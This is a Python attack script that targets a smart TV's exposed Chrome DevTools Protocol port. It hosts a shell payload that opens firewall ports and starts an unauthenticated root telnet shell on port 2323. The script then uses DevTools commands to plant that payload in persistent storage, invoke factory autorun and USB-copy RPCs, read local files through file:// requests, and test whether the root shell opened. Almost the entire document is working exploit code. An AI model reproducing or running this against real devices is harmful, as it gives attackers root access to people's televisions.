#!/usr/bin/env python3
"""CDP Attack — waits for CDP, runs all attacks fast."""
import json, socket, struct, time, urllib.request, re, sys, threading, http.server

TV = sys.argv[1] if len(sys.argv) > 1 else "192.168.1.100"
PC = sys.argv[2] if len(sys.argv) > 2 else "192.168.1.50"
PC_PORT = 8099

CUSTOMER_ENV = r'''#!/bin/sh
iptables -w 5 -I INPUT -p tcp --dport 2323 -j ACCEPT 2>/dev/null
iptables -w 5 -I INPUT -p tcp --dport 2222 -j ACCEPT 2>/dev/null
if [ -f /media/sda1/busybox-armhf ]; then
    cp /media/sda1/busybox-armhf /tmp/busybox
    chmod +x /tmp/busybox
    /tmp/busybox telnetd -p 2323 -l /bin/sh
elif [ -f /tmp/busybox ]; then
    /tmp/busybox telnetd -p 2323 -l /bin/sh
else
    busybox telnetd -p 2323 -l /bin/sh 2>/dev/null
fi
echo root_ok > /tmp/root_proof
'''

download_hits = []

class Handler(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        download_hits.append(self.path)
        if 'customer_env' in self.path:
            print(f'  [HTTP] *** HIT: {self.path} ***')
            c = CUSTOMER_ENV.encode()
            self.send_response(200)
            self.send_header('Content-Type', 'application/octet-stream')
            self.send_header('Content-Disposition', 'attachment; filename="customer_env.sh"')
            self.send_header('Content-Length', len(c))
            self.end_headers()
            self.wfile.write(c)
        elif 'enable_debug' in self.path:
            print(f'  [HTTP] *** HIT enable_debug: {self.path} ***')
            self.send_response(200)
            self.send_header('Content-Type', 'application/octet-stream')
            self.send_header('Content-Disposition', 'attachment; filename="enable_debug_port"')
            self.send_header('Content-Length', 0)
            self.end_headers()
        else:
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b'ok')
    def log_message(self, *a): pass

httpd = http.server.HTTPServer(('0.0.0.0', PC_PORT), Handler)
threading.Thread(target=httpd.serve_forever, daemon=True).start()
print(f'[+] HTTP server on :{PC_PORT}')

msg_id = [0]

def ws_connect(ws_url):
    m = re.match(r'ws://([^:]+):(\d+)(.*)', ws_url)
    h, p, path = m.group(1), int(m.group(2)), m.group(3)
    s = socket.create_connection((h, p), timeout=10)
    s.sendall(f'GET {path} HTTP/1.1\r\nHost: {h}:{p}\r\nUpgrade: websocket\r\nConnection: Upgrade\r\nSec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==\r\nSec-WebSocket-Version: 13\r\n\r\n'.encode())
    r = b''
    while b'\r\n\r\n' not in r: r += s.recv(4096)
    return s

def ws_send(sock, data):
    p = data.encode()
    f = bytearray([0x81])
    l = len(p)
    if l < 126: f.append(0x80|l)
    elif l < 65536: f.append(0x80|126); f.extend(struct.pack('>H',l))
    else: f.append(0x80|127); f.extend(struct.pack('>Q',l))
    mask = b'\x01\x02\x03\x04'
    f.extend(mask)
    f.extend(bytes(b^mask[i%4] for i,b in enumerate(p)))
    sock.sendall(bytes(f))

def ws_recv(sock, timeout=8):
    sock.settimeout(timeout)
    try:
        d = sock.recv(65536)
        if len(d)<2: return None
        pl = d[1]&0x7f; o=2
        if pl==126: pl=struct.unpack('>H',d[2:4])[0]; o=4
        elif pl==127: pl=struct.unpack('>Q',d[2:10])[0]; o=10
        payload = d[o:]
        while len(payload)<pl: payload += sock.recv(65536)
        return payload[:pl].decode('utf-8',errors='replace')
    except: return None

def cdp(sock, method, params=None):
    msg_id[0]+=1
    c = {'id':msg_id[0],'method':method}
    if params: c['params']=params
    ws_send(sock, json.dumps(c))
    r = ws_recv(sock, 10)
    return json.loads(r) if r else None

def ev(sock, expr, t=8):
    msg_id[0]+=1
    ws_send(sock, json.dumps({'id':msg_id[0],'method':'Runtime.evaluate','params':{'expression':expr,'returnByValue':True,'awaitPromise':True}}))
    r = ws_recv(sock, t)
    if r:
        d=json.loads(r)
        res=d.get('result',{}).get('result',{})
        return res.get('value', res.get('description', str(res)))
    return None

def check_telnet():
    try:
        t=socket.create_connection((TV,2323),timeout=3)
        t.sendall(b'id\n')
        time.sleep(1)
        r=t.recv(4096).decode(errors='replace')
        t.close()
        return r
    except: return None

# ========== WAIT FOR CDP ==========
print(f'\n[*] Waiting for CDP on {TV}:7788 ...')
print(f'    Open a browser app on the TV (YouTube, Internet, Titan Store)')
for i in range(120):
    try:
        targets = json.loads(urllib.request.urlopen(f'http://{TV}:7788/json', timeout=3).read())
        version = json.loads(urllib.request.urlopen(f'http://{TV}:7788/json/version', timeout=3).read())
        break
    except:
        if i%10==0: print(f'  ... waiting ({i}s)')
        time.sleep(1)
else:
    print('TIMEOUT: CDP never opened'); sys.exit(1)

bws = version.get('webSocketDebuggerUrl','')
pws = targets[0]['webSocketDebuggerUrl']
print(f'[+] CDP UP! Targets: {len(targets)}')
for t in targets:
    print(f'    {t["title"]}: {t["url"]}')

# Connect both
print('\n[*] Connecting...')
bs = ws_connect(bws)
ps = ws_connect(pws)
print('[+] Both WS connected, attacking fast!\n')

# ============================================================
# ATTACK 1: Browser.setDownloadBehavior on BROWSER ws
# ============================================================
print('='*60)
print('ATTACK 1: Browser.setDownloadBehavior (browser WS)')
print('='*60)
for dp in ['/mtd_rwarea/apdat/', '/tmp/', '/mtd_rwarea/apdat']:
    r = cdp(bs, 'Browser.setDownloadBehavior', {'behavior':'allow','downloadPath':dp})
    err = r.get('error',{}).get('message','') if r else 'no response'
    ok = 'error' not in (r or {})
    print(f'  {dp}: {"OK!" if ok else err}')
    if ok:
        print(f'  *** DOWNLOAD PATH SET: {dp} ***')
        # Trigger download immediately
        ev(ps, f'''
        (function(){{
            var a=document.createElement('a');
            a.href='http://{PC}:{PC_PORT}/download/customer_env.sh';
            a.download='customer_env.sh';
            document.body.appendChild(a);
            a.click();
            return 'clicked';
        }})()
        ''')
        time.sleep(2)
        break

# ============================================================
# ATTACK 2: Page.setDownloadBehavior + multiple triggers
# ============================================================
print('\n' + '='*60)
print('ATTACK 2: Page.setDownloadBehavior + download triggers')
print('='*60)
r = cdp(ps, 'Page.setDownloadBehavior', {'behavior':'allow','downloadPath':'/mtd_rwarea/apdat/'})
print(f'  Set: {json.dumps(r)[:150]}')

# Trigger 1: anchor
ev(ps, f'''(function(){{var a=document.createElement('a');a.href='http://{PC}:{PC_PORT}/download/customer_env.sh';a.download='customer_env.sh';document.body.appendChild(a);a.click();return 'ok';}})()''')
print('  Trigger: anchor click')
time.sleep(2)

# Trigger 2: iframe
ev(ps, f'''(function(){{var f=document.createElement('iframe');f.style.display='none';f.src='http://{PC}:{PC_PORT}/download/customer_env.sh';document.body.appendChild(f);return 'ok';}})()''')
print('  Trigger: iframe')
time.sleep(2)

# Trigger 3: window.location (last resort, will navigate away)
# Skip for now to keep page alive

# Check HTTP hits
print(f'  HTTP hits so far: {download_hits}')

# ============================================================
# ATTACK 3: RpcFactoryAutorunScript + RpcFactoryCopyUSBtoTV
# ============================================================
print('\n' + '='*60)
print('ATTACK 3: RPC Factory functions')
print('='*60)

# Subscribe to events first
ev(ps, '''
(function(){
    window.__rr=[];
    var evts=['N_FactoryAutorunScript','N_FactoryCopyUSBtoTV','N_FactoryCopyTVtoUSB',
              'N_SystemCheckFileExist','N_SystemDebugMenuSet','N_SystemFactoryNetTVDebugSet',
              'N_UpdateHtmlWrite','N_SystemAppInstall'];
    for(var i=0;i<evts.length;i++){
        (function(e){
            try{RpcSubscribe(e,function(d){window.__rr.push(e+':'+JSON.stringify(d));});}catch(x){}
        })(evts[i]);
    }
    return 'subscribed:'+evts.length;
})()
''')

# RpcFactoryAutorunScript
print('  RpcFactoryAutorunScript:')
for arg in ['{}', '{"path":"/media/sda1/autoroot.sh"}', '{"AutorunScript":"start"}',
            '{"script":"/media/sda1/autoroot.sh","action":"run"}']:
    r = ev(ps, f'(function(){{try{{return JSON.stringify(RpcFactoryAutorunScript({arg}));}}catch(e){{return "E:"+e.message;}}}})()')
    print(f'    ({arg[:40]}): {r}')

# RpcFactoryCopyUSBtoTV
print('  RpcFactoryCopyUSBtoTV:')
for arg in ['{}', '{"CopyUSBtoTV":"start"}', '{"action":"copy"}']:
    r = ev(ps, f'(function(){{try{{return JSON.stringify(RpcFactoryCopyUSBtoTV({arg}));}}catch(e){{return "E:"+e.message;}}}})()')
    print(f'    ({arg[:40]}): {r}')

# RpcDemomeGetUSBPath - find USB path on TV
print('  RpcDemomeGetUSBPath:')
r = ev(ps, '(function(){try{return JSON.stringify(RpcDemomeGetUSBPath({}));}catch(e){return "E:"+e.message;}})()')
print(f'    result: {r}')

# RpcUpdateHtmlWrite - might write files!
print('  RpcUpdateHtmlWrite:')
r = ev(ps, f'(function(){{try{{return JSON.stringify(RpcUpdateHtmlWrite({{"content":"test","path":"/tmp/htmlwrite_test"}}));}}catch(e){{return "E:"+e.message;}}}})()')
print(f'    result: {r}')

time.sleep(2)
# Check async results
r = ev(ps, 'JSON.stringify(window.__rr||[])')
print(f'  Async RPC results: {str(r)[:500]}')

# ============================================================
# ATTACK 4: file:// read + XHR write attempt
# ============================================================
print('\n' + '='*60)
print('ATTACK 4: file:// operations')
print('='*60)

# Read critical files
for path in ['/etc/hosts', '/mtd_rwarea/apdat/customer_env.sh', '/proc/self/status',
             '/mtd_rwarea/apdat/', '/media/sda1/']:
    r = ev(ps, f'''(function(){{try{{var x=new XMLHttpRequest();x.open('GET','file://{path}',false);x.send();return x.responseText.substring(0,300);}}catch(e){{return 'E:'+e.message;}}}})()''')
    print(f'  {path}: {str(r)[:200]}')

# XHR PUT attempt (probably won't work but try)
print('\n  XHR PUT write attempt:')
r = ev(ps, f'''
(function(){{
    try {{
        var x = new XMLHttpRequest();
        x.open('PUT', 'file:///mtd_rwarea/apdat/customer_env.sh', false);
        x.send({json.dumps(CUSTOMER_ENV)});
        return 'PUT status:' + x.status;
    }} catch(e) {{ return 'E:' + e.message; }}
}})()
''')
print(f'  PUT result: {r}')

# webkitRequestFileSystem write attempt
print('\n  webkitRequestFileSystem write:')
r = ev(ps, '''
(function(){
    return new Promise(function(resolve) {
        try {
            window.webkitRequestFileSystem(window.PERSISTENT, 10*1024*1024, function(fs) {
                resolve('FS:' + fs.name + ' root=' + fs.root.fullPath);
            }, function(e) {
                // Try TEMPORARY
                window.webkitRequestFileSystem(window.TEMPORARY, 10*1024*1024, function(fs) {
                    resolve('TMP_FS:' + fs.name + ' root=' + fs.root.fullPath);
                }, function(e2) {
                    resolve('ERR:' + e.name + '/' + e2.name);
                });
            });
        } catch(e) { resolve('CATCH:' + e.message); }
    });
})()
''', 10)
print(f'  Result: {r}')

# ============================================================
# ATTACK 5: Fetch API to write via our server + read back
# ============================================================
print('\n' + '='*60)
print('ATTACK 5: Fetch-based download')
print('='*60)
r = ev(ps, f'''
(function(){{
    return fetch('http://{PC}:{PC_PORT}/download/customer_env.sh')
        .then(function(r){{ return r.text(); }})
        .then(function(t){{ return 'FETCHED:' + t.substring(0, 100); }})
        .catch(function(e){{ return 'ERR:' + e.message; }});
}})()
''', 10)
print(f'  Fetch result: {r}')

print(f'\n  Total HTTP hits: {download_hits}')

# ============================================================
# FINAL CHECK
# ============================================================
print('\n' + '='*60)
print('FINAL')
print('='*60)
tel = check_telnet()
if tel:
    print(f'  *** TELNET OPEN: {tel} ***')
else:
    print('  Telnet:2323 closed')

# Verify customer_env.sh
r = ev(ps, '''(function(){try{var x=new XMLHttpRequest();x.open('GET','file:///mtd_rwarea/apdat/customer_env.sh',false);x.send();if(x.responseText.length>0)return 'EXISTS:'+x.responseText.substring(0,100);return 'empty/missing';}catch(e){return 'E:'+e.message;}})()''')
print(f'  customer_env.sh: {r}')

# Verify /tmp/ files
r = ev(ps, '''(function(){try{var x=new XMLHttpRequest();x.open('GET','file:///tmp/root_proof',false);x.send();return x.responseText;}catch(e){return 'E:'+e.message;}})()''')
print(f'  /tmp/root_proof: {r}')

r = ev(ps, '''(function(){try{var x=new XMLHttpRequest();x.open('GET','file:///tmp/cdp_root_proof',false);x.send();return x.responseText;}catch(e){return 'E:'+e.message;}})()''')
print(f'  /tmp/cdp_root_proof: {r}')

bs.close()
ps.close()
httpd.shutdown()
print('\n=== ALL ATTACKS DONE ===')
